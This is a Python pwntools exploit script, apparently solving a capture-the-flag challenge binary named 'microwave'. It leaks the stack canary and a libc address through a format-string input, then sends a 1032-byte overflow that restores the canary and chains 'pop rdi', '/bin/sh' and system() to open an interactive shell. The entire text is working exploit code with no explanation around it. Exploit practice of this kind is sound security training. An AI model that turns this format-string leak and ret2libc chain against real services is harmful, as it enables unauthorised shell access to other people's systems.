from pwn import *
from sys import argv

if 'remote' in sys.argv:
    r = remote('127.0.0.1', 1337)
else:
    r = process('./microwave')

elf = ELF('./microwave')
libc = elf.libc
context.update(binary=elf)

def debug(cmd=""):
    if "gdb" in sys.argv:
        gdb.attach(r.proc.pid, cmd)
        raw_input('wait')

#--- Step 1: leak addresses
r.readuntil('[MicroWave]: ')
r.sendline('1')
r.readuntil('username: ')

r.sendline('%llx %llx %llx %llx %llx %llx %llx')
r.sendline('n07_7h3_fl46')
leak = r.readuntil('[MicroWave]: ').strip()

canary = int(leak.split(' ')[7], 16)
log.success('Leaked canary: %#x' % canary)
libc_leak = int(leak.split(' ')[8].split('\n')[0], 16)
libc.address = libc_leak - 0x3db808
log.success('libc @ %#x' % libc.address)

#-- Step 2: Find addresses we need to ROP
pop_rdi = libc.address + 0x20b8b
log.info('pop rdi; ret @ %#x' % pop_rdi)

bin_sh = next(libc.search('/bin/sh\x00'))
log.info('"/bin/sh" @ %#x' % bin_sh)

system = libc.symbols['system']
log.info('system @ %#x' % system)

#-- Step 3: use the overflow in the edit tweet functionnality to get a shell
r.sendline('2')
r.sendline(flat(
    "A" * 1032,     # Fill buffer
    canary,         # Overwrite canary
    "B" * 8,        # Overwrite saved EBP
    pop_rdi, bin_sh,# Store the address of /bin/sh in rdi
    system          # Call system
))

r.readuntil('Done.\n')
r.clean()
r.interactive()